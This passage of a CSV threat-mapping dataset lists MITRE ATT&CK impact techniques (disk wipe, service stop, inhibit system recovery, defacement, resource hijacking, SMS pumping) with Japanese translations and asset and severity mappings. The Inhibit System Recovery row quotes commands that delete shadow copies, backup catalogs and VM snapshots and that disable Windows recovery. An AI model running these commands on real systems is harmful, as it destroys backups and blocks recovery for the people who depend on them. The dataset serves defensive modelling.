Novetta Blockbuster Destructive Malware)",攻撃者は、特定のシステムやネットワーク内の多数のシステム上のストレージデバイスの内容を消去し、システムおよびネットワークリソースへのアクセスを妨害する可能性があります。 敵対者は、ストレージデバイスの内容を部分的または完全に上書きし、ストレージインターフェースを通じてデータを回復不可能にする場合があります。(引用: Novetta Blockbuster)(引用: Novetta Blockbuster 破壊的マルウェア)(引用: DOJ Lazarus Sony 2018)特定のディスク構造やファイルをワイプする代わりに、破壊的な意図を持つ敵対者は、ディスク内容の任意の部分をワイプする場合があります。 ディスク内容を消去するため、敵対者はハードドライブへの直接アクセスを取得し、ランダムデータで任意サイズの領域を上書きすることがある（引用：Novetta Blockbuster 破壊的マルウェア）。敵対者が[RawDisk](https://attack.mitre.org/software/S0364)のようなサードパーティ製ドライバーを活用してディスク内容に直接アクセスする事例が確認されている。（引用元：Novetta Blockbuster）（引用元：Novetta Blockbuster Destructive Malware）この動作は、個々のファイルではなくディスクのセクション全体を消去するという点で、[Data Destruction](https://attack.mitre.org/techniques/T1485)とは異なります。 ネットワーク全体の可用性中断を目的とする作戦において標的組織への影響を最大化するため、ディスク内容消去用マルウェアはワーム的特徴を有し、[有効なアカウント](https://attack.mitre.org/techniques/T1078)、 [OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)、[Windows管理共有](https://attack.mitre.org/techniques/T1077)などの追加手法を活用してネットワーク全体に拡散するワーム的特性を持つ場合があります。（引用元：Novetta Blockbuster Destructive Malware）,impact,Linux;macOS;Windows,credential_abuse,impact,authentication_system;network_connectivity;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--b82f7d37-b826-4ec9-9391-8e121c78aed7,2019-03-29T14:59:50.763Z,2025-04-25T15:16:02.275Z,,,,
T1489,,Service Stop,サービスの停止,"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) Adversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible.(Citation: Novetta Blockbuster) In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server, or on virtual machines hosted on ESXi infrastructure.(Citation: SecureWorks WannaCry Analysis)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",攻撃者は、正当なユーザーがサービスを利用できないようにするため、システム上のサービスを停止または無効化する場合があります。 重要なサービスやプロセスを停止すると、インシデントへの対応が妨げられたり停止したり、環境への損害を与えるという攻撃者の全体的な目的を助長する可能性があります。(引用: Talos Olympic Destroyer 2018)(引用: Novetta Blockbuster)攻撃者は、組織にとって非常に重要な個々のサービス（たとえば、Exchange コンテンツにアクセスできなくなる <code>MSExchangeIS</code>）を無効化することで、これを達成する場合があります。(引用元: Novetta Blockbuster) 場合によっては、攻撃者はシステムを無効化するために多数のサービスまたは全サービスを停止・無効化することがある。(引用元: Talos Olympic Destroyer 2018) サービスやプロセスは、実行中に自身のデータストアを変更できない場合がある。 攻撃者は、ExchangeやSQL Serverなどのサービス、あるいはESXiインフラ上でホストされる仮想マシンのデータストアに対して、[データ破壊](https://attack.mitre.org/techniques/T1485)や[影響力目的のデータ暗号化](https://attack.mitre.org/techniques/T1486)を実施するために、サービスやプロセスを停止させる可能性があります。(引用元: SecureWorks WannaCry Analysis)(引用元: Crowdstrike Hypervisor Jackpotting Pt 2 2021),impact,Windows;Linux;macOS;ESXi,destructive_impact,impact,user_interaction;endpoint_execution;email_infrastructure;database_access,specified,Business Workstation;File Server;Mail / Collaboration;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b,2019-03-29T19:00:55.901Z,2025-04-15T19:58:12.942Z,,,,
T1490,,Inhibit System Recovery,システム復旧の妨害,"Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options. Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom) A number of native Windows utilities have been used by adversaries to disable or delete system recovery features: * <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code> * [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code> * <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code> * <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code> * <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system * <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware) On network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations. On ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486), preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).(Citation: Cybereason) Adversaries may also delete “online Ebackups that are connected to their network  Ewhether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)",攻撃者は、破損したシステムの復旧を支援する組み込みデータを削除または除去し、サービスを無効化して復旧を妨げる可能性があります。(引用: Talos Olympic Destroyer 2018)(引用: FireEye WannaCry 2017) これにより、利用可能なバックアップや復旧オプションへのアクセスが拒否される場合があります。オペレーティングシステムには、バックアップカタログ、ボリュームシャドウコピー、自動修復機能など、破損したシステムを修復するのに役立つ機能が含まれている場合があります。 攻撃者は、[データ破壊](https://attack.mitre.org/techniques/T1485) および [影響拡大のためのデータ暗号化](https://attack.mitre.org/techniques/T1486) の効果を増幅させるため、システム復旧機能を無効化または削除する可能性があります。(引用: Talos Olympic Destroyer 2018)(引用: FireEye WannaCry 2017)さらに、攻撃者は復旧通知を無効化した後、バックアップを破損させる可能性があります。(引用: disable_notif_synology_ransom) 攻撃者は、システム回復機能を無効化または削除するために、複数のネイティブ Windows ユーティリティを使用しています: * <code>vssadmin.exe</code> は、システム上のすべてのボリュームシャドウコピーを削除するために使用できます - <code>vssadmin.exe delete shadows /all /quiet</code> * [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) はボリュームシャドウコピーを削除するために使用可能 - <code>wmic shadowcopy delete</code> * <code>wbadmin.exe</code> はWindowsバックアップカタログを削除するために使用可能 - <code>wbadmin.exe delete catalog -quiet</code> * <code>bcdedit.exe</code> は、ブート構成データを変更することで Windows の自動回復機能を無効化できます - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code> * <code>REAgentC.exe</code> は、感染したシステムの Windows リカバリ環境 (WinRE) の修復/リカバリオプションを無効化するために使用できます *<code>diskshadow.exe</code> は、システム上のすべてのボリューム シャドウ コピーを削除するために使用できます - <code>diskshadow delete shadows all</code> (出典: Diskshadow) (出典: Crytox ランサムウェア) ネットワークデバイスでは、攻撃者は[Disk Wipe](https://attack.mitre.org/techniques/T1561)を利用してバックアップファームウェアイメージを削除しファイルシステムを再フォーマットした後、[System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529)でデバイスを再起動させる可能性があります。 これらの活動により、ネットワークデバイスは完全に動作不能となり、復旧作業が妨げられる可能性があります。 ESXi サーバーでは、攻撃者は仮想マシンのスナップショットを削除または暗号化し、[影響力のためのデータ暗号化](https://attack.mitre.org/techniques/T1486) を支援し、バックアップとして活用されるのを防ぐ場合があります（例：`vim-cmd vmsvc/snapshot.removeall` を使用）。（引用元：Cybereason）また、ネットワークストレージメディアやクラウドサービスと同期するフォルダを介して、ネットワークに接続されている「オンライン」Eバックアップを削除する場合もあります。(引用元: ZDNet Ransomware Backups 2020) クラウド環境では、攻撃者はバージョン管理やバックアップポリシーを無効化し、災害復旧シナリオで使用されるスナップショット、データベースバックアップ、マシンイメージ、オブジェクトの以前のバージョンを削除する可能性があります。(引用元: Dark Reading Code Spaces Cyber Attack)(引用元: Rhino Security Labs AWS S3 Ransomware),impact,Windows;macOS;Linux;Network Devices;IaaS;Containers;ESXi,config_policy_manipulation,impact,user_interaction;network_connectivity;cloud_control_plane;file_storage_access;database_access;logging_monitoring,specified,Backup Server;Business Workstation;File Server;Log / Monitoring Server;My Number Administrative System on GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a,2019-04-02T13:54:43.136Z,2025-04-15T19:59:22.100Z,,,,
T1491,,Defacement,改ざん,"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages.",敵対者は、企業ネットワークの内部または外部で利用可能な視覚的コンテンツを改変し、元のコンテンツの完全性に影響を与える可能性があります。[改ざん](https://attack.mitre.org/techniques/T1491)の目的には、メッセージの伝達、威嚇、または侵入に対する（おそらく虚偽の）功績の主張が含まれます。 不快または攻撃的な画像は、ユーザーに不快感を与えるため、あるいは付随するメッセージへの従順を強要するために、[改ざん](https://attack.mitre.org/techniques/T1491)の一環として使用されることがある。,impact,Windows;IaaS;Linux;macOS;ESXi,destructive_impact,impact,user_interaction;network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b,2019-04-08T17:51:41.390Z,2025-04-25T15:15:35.374Z,,,,
T1491.001,T1491,Internal Defacement,内部改ざん,"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster)(Citation: Varonis) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)",攻撃者は組織内部のシステムを改ざんし、ユーザーを威嚇・欺瞞することでシステムの信頼性を損なう可能性がある。内部ウェブサイトの改変、サーバーログインメッセージの変更、デスクトップ壁紙の直接置換などが該当する。(引用: Novetta Blockbuster)(引用: Varonis) ユーザーに不快感を与えたり、付随するメッセージへの従順を強要したりするために、[内部改ざん](https://attack.mitre.org/techniques/T1491/001)の一環として不快または攻撃的な画像が使用されることがある。 内部システムへの改ざんは攻撃者の存在を露呈させるため、他の侵入目的が達成された後に実施されることが多い。(引用: Novetta Blockbuster Destructive Malware),impact,Linux;macOS;Windows;ESXi,destructive_impact,impact,authentication_system;user_interaction;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--8c41090b-aa47-4331-986b-8c9a51a91103,2020-02-20T14:31:34.778Z,2025-04-15T19:58:49.776Z,,,,
T1491.002,T1491,External Defacement,外部改ざん,"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)",敵対者は、メッセージの伝達、威嚇、あるいは組織やユーザーを誤導する目的で、組織外部のシステムを改ざんすることがある。 [外部改ざん](https://attack.mitre.org/techniques/T1491/002)は、最終的にユーザーにシステムへの不信感を与え、システムの完全性を疑問視・信用失墜させる可能性がある。外部向けウェブサイトは改ざんの一般的な標的であり、政治的メッセージの押し付けやプロパガンダの拡散を目的として、敵対者やハクティビスト集団から頻繁に狙われる。（引用元：FireEye「メディア産業に対するサイバー脅威」）（引用元：ケビン・マンディア米国上院情報委員会への証言）（引用元：アノニマスハッカーによるロシア政府サイト改ざん）[外部改ざん](https://attack.mitre.org/techniques/T1491/002)は、事象を引き起こす触媒として、あるいは組織や政府の行動に対する反応として利用される可能性がある。 同様に、ウェブサイト改ざんは、[ドライブバイ攻撃](https://attack.mitre.org/techniques/T1189)などの将来の攻撃のための準備段階や前兆として利用されることもある。（引用元：Trend Micro Deep Dive Into Defacement）,impact,Windows;IaaS;Linux;macOS,destructive_impact,impact,mfa_in_use;user_interaction,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--0cfe31a7-81fc-472c-bc45-e2808d1066a3,2020-02-20T14:34:08.496Z,2025-04-15T22:34:21.584Z,,,,
T1492,,Stored Data Manipulation,保存データの改ざん,"Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",敵対者は、外部への影響操作や活動の隠蔽を目的として、保存状態にあるデータを挿入、削除、または操作することがあります。（引用元：FireEye APT38 2018年10月）（引用元：DOJ Lazarus Sony 2018）保存データの操作により、敵対者は業務プロセス、組織の理解、意思決定に影響を与えようと試みる可能性があります。 保存データには、Officeファイル、データベース、保存メール、カスタムファイル形式など、様々なファイル形式が含まれる可能性がある。改変の種類と影響は、データの種類、および攻撃者の目標と目的に依存する。複雑なシステムの場合、攻撃者は望ましい影響を得るために、通常は長期にわたる情報収集活動を通じて得られる、システムに関連する特別な専門知識と、おそらくは専用ソフトウェアへのアクセスを必要とする可能性が高い。,impact,Linux;macOS;Windows,destructive_impact,impact,user_interaction;endpoint_execution;email_infrastructure;file_storage_access;database_access,specified,Business Workstation;File Server;Mail / Collaboration;My Number Administrative System on GovCloud;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92,2019-04-09T11:51:30.942Z,2025-04-25T15:15:07.583Z,,,,
T1493,,Transmitted Data Manipulation,伝送データ改ざん,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",敵対者は、外部への結果を操作したり活動を隠蔽したりするため、ストレージや他のシステムへの転送途中のデータを改変する可能性がある。（引用元：FireEye APT38 2018年10月）（引用元：DOJ Lazarus Sony 2018）伝送データを操作することで、敵対者は業務プロセス、組織の理解、意思決定に影響を与えようとする可能性がある。 ネットワーク接続上、あるいはシステムプロセス間で、情報を傍受・変更するツールを展開する機会があれば、操作が可能となる。変更の種類と影響は、標的となる伝送メカニズムと、敵対者の目標・目的に依存する。複雑なシステムの場合、敵対者は通常、望ましい影響を得るために長期にわたる情報収集活動を通じて得られる、システム関連の専門知識と特殊なソフトウェアへのアクセスを必要とする可能性が高い。,impact,Linux;macOS;Windows,destructive_impact,impact,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8,2019-04-09T16:08:20.824Z,2025-04-25T15:16:09.956Z,,,,
T1494,,Runtime Data Manipulation,実行時データ操作,"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1042) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",攻撃者は、エンドユーザーがアクセス・表示するデータを操作するため、システムを改変する可能性がある。（出典: FireEye APT38 2018年10月）（出典: DOJ Lazarus Sony 2018）実行時データの操作により、攻撃者は業務プロセス、組織の理解、意思決定に影響を与えようとする。 攻撃者は、データ表示に使用されるアプリケーションバイナリを変更して実行時操作を引き起こす可能性がある。また、[デフォルトのファイル関連付けの変更](https://attack.mitre.org/techniques/T1042)や[偽装](https://attack.mitre.org/techniques/T1036)を実施して同様の効果をもたらす場合もある。 改変の種類と影響は、標的となるアプリケーションやプロセス、ならびに攻撃者の目的によって異なります。複雑なシステムの場合、攻撃者は通常、長期にわたる情報収集活動を通じて得られる、システム関連の専門知識や特殊ソフトウェアへのアクセスを必要とし、それによって望ましい影響を及ぼすことが可能となります。,impact,Linux;macOS;Windows,destructive_impact,impact,authentication_system;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--ca205a36-c1ad-488b-aa6c-ab34bdd3a36b,2019-04-09T16:09:22.173Z,2025-04-25T15:16:09.328Z,,,,
T1495,,Firmware Corruption,ファームウェアの破損,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards. In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485).",攻撃者は、システムに接続されたデバイス内のシステムBIOSやその他のファームウェアのフラッシュメモリ内容を上書きまたは破損させ、それらを動作不能または起動不能にすることで、デバイスおよび／またはシステムの使用を妨害する可能性がある。(引用: Symantec Chernobyl W95.CIH) ファームウェアとは、ハードウェアデバイス上の不揮発性メモリから読み込まれ実行されるソフトウェアであり、デバイスの初期化と機能管理を行う。 対象デバイスにはマザーボード、ハードドライブ、ビデオカードなどが含まれる。一般的に、攻撃者はシステムやデバイスの使用を妨害するため、ファームウェアを操作・上書き・破損させる可能性がある。 例えば、ネットワークデバイス用のオペレーティングシステムをロードするファームウェアが破損すると、ネットワークデバイスが動作不能になる可能性があります。(引用: dhs_threat_to_net_devices)(引用: cisa_malware_orgs_ukraine) デバイスによっては、この攻撃により[データ破壊](https://attack.mitre.org/techniques/T1485)が発生する可能性もあります。,impact,Linux;macOS;Windows;Network Devices,destructive_impact,impact,endpoint_execution;network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--f5bb433e-bdf6-4781-84bc-35e97e43be89,2019-04-12T18:28:15.451Z,2025-04-16T20:37:22.991Z,,,,
T1496,,Resource Hijacking,リソースハイジャック,"Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. Resource hijacking may take a number of different forms. For example, adversaries may: * Leverage compute resources in order to mine cryptocurrency * Sell network bandwidth to proxy networks * Generate SMS traffic for profit * Abuse cloud-based messaging services to send large quantities of spam messages In some cases, adversaries may leverage multiple types of Resource Hijacking at once.(Citation: Sysdig Cryptojacking Proxyjacking 2023)",敵対者は、リソース集約的なタスクを完了するために、乗っ取ったシステムのリソースを活用する場合があり、システムやホストされているサービスの可用性に影響を与える可能性があります。 リソースハイジャックは様々な形態をとり得る。例えば、敵対者は以下を行う可能性がある：* 仮想通貨採掘のための計算リソースの悪用* プロキシネットワークへのネットワーク帯域幅の販売* 利益目的のSMSトラフィック生成* 大量のスパムメッセージ送信のためのクラウドベースメッセージングサービスの悪用場合によっては、敵対者が複数のリソースハイジャック手法を同時に悪用する可能性がある。(引用元: Sysdig Cryptojacking Proxyjacking 2023),impact,Windows;IaaS;Linux;macOS;Containers;SaaS,destructive_impact,impact,network_connectivity;cloud_control_plane,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783,2019-04-17T14:50:05.682Z,2025-04-15T23:00:21.372Z,,,,
T1496.001,T1496,Compute Hijacking,コンピューティングハイジャック,"Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. One common purpose for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs) Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.(Citation: Trend Micro War of Crypto Miners)",攻撃者は、乗っ取ったシステムの計算リソースを活用してリソース集約的なタスクを実行し、システムおよび／またはホストされているサービスの可用性に影響を与える可能性があります。 [コンピューティングハイジャック](https://attack.mitre.org/techniques/T1496/001)の一般的な目的の一つは、暗号通貨ネットワークの取引を検証し仮想通貨を獲得することである。攻撃者は十分なシステムリソースを消費し、影響を受けたマシンに悪影響を与えたり応答不能にしたりする可能性がある。(出典: Kaspersky Lazarus Under The Hood Blog 2017) サーバーやクラウドベースのシステムは利用可能なリソースの潜在的な高さが理由から一般的な標的となるが、ユーザーエンドポイントシステムも侵害され、[コンピューティングハイジャック](https://attack.mitre.org/techniques/T1496/001)や暗号通貨マイニングに利用される可能性がある。(引用元: CloudSploit - Unused AWS Regions) コンテナ化された環境も、公開APIを介した展開の容易さと、環境やクラスター内で複数のコンテナを展開または侵害することでマイニング活動を拡大できる可能性から標的となる。(引用元: Unit 42 Hildegard Malware)(引用元: Trend Micro Exposed Docker APIs)さらに、一部の暗号通貨マイニングマルウェアは競合するマルウェアのプロセスを特定して強制終了し、リソース争いを回避します。(引用元: Trend Micro War of Crypto Miners),impact,Windows;IaaS;Linux;macOS;Containers,destructive_impact,impact,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--a718a0c8-5768-41a1-9958-a1cc3f995e99,2024-09-25T13:34:30.100Z,2025-04-15T22:08:46.014Z,,,,
T1496.002,T1496,Bandwidth Hijacking,帯域幅ハイジャック,"Adversaries may leverage the network bandwidth resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.(Citation: Sysdig Proxyjacking) Finally, they may engage in internet-wide scanning in order to identify additional targets for compromise.(Citation: Unit 42 Leaked Environment Variables 2024) In addition to incurring potential financial costs or availability disruptions, this technique may cause reputational damage if a victim’s bandwidth is used for illegal activities.(Citation: Sysdig Proxyjacking)",攻撃者は、乗っ取ったシステムのネットワーク帯域幅リソースを活用してリソース集約型タスクを実行し、システムおよび／またはホストサービスの可用性に影響を与える可能性があります。また、攻撃者はボットネットの一部としてシステムのネットワーク帯域幅を利用するマルウェアを使用し、[ネットワークサービス拒否攻撃](https://attack.mitre.org/techniques/T1498)キャンペーンを促進したり、悪意のあるトレントを拡散させたりする可能性があります。(出典: GoBotKR) あるいは、被害者のネットワーク帯域幅とIPアドレスをプロキシウェアサービスに販売するプロキシジャックを行う場合もある。(出典: Sysdig Proxyjacking) 最後に、さらなる侵害対象を特定するため、インターネット全体のスキャンを行う可能性がある。(引用元: Unit 42 Leaked Environment Variables 2024) 潜在的な金銭的損失や可用性障害に加え、被害者の帯域幅が違法活動に利用された場合、この手法は評判の毀損を引き起こす可能性があります。(引用元: Sysdig Proxyjacking),impact,Linux;Windows;macOS;IaaS;Containers,destructive_impact,impact,network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--718cb208-6446-4572-a2f0-9c799c60091e,2024-09-25T13:44:35.412Z,2025-04-15T21:52:31.979Z,,,,
T1496.003,T1496,SMS Pumping,SMSポンピング,"Adversaries may leverage messaging services for SMS pumping, which may impact system and/or hosted service availability.(Citation: Twilio SMS Pumping) SMS pumping is a type of telecommunications fraud whereby a threat actor first obtains a set of phone numbers from a telecommunications provider, then leverages a victim’s messaging infrastructure to send large amounts of SMS messages to numbers in that set. By generating SMS traffic to their phone number set, a threat actor may earn payments from the telecommunications provider.(Citation: Twilio SMS Pumping Fraud) Threat actors often use publicly available web forms, such as one-time password (OTP) or account verification fields, in order to generate SMS traffic. These fields may leverage services such as Twilio, AWS SNS, and Amazon Cognito in the background.(Citation: Twilio SMS Pumping)(Citation: AWS RE:Inforce Threat Detection 2024) In response to the large quantity of requests, SMS costs may increase and communication channels may become overwhelmed.(Citation: Twilio SMS Pumping)",攻撃者はSMSポンピングのためにメッセージングサービスを利用し、システムおよび／またはホスト型サービスの可用性に影響を与える可能性がある。(引用元: Twilio SMS Pumping) SMSポンピングは、脅威アクターがまず通信事業者から電話番号のセットを入手し、その後被害者のメッセージングインフラを利用してそのセット内の番号に大量のSMSメッセージを送信する通信詐欺の一種である。 脅威アクターは、自身の電話番号セットへのSMSトラフィックを生成することで、通信事業者から支払いを得ることがあります。(引用: Twilio SMS Pumping Fraud) 脅威アクターは、SMSトラフィックを生成するために、ワンタイムパスワード(OTP)やアカウント認証フィールドなどの公開されているWebフォームを頻繁に利用します。 これらのフィールドは、バックグラウンドでTwilio、AWS SNS、Amazon Cognitoなどのサービスを利用している可能性があります（引用元：Twilio SMS Pumping）（引用元：AWS RE:Inforce Threat 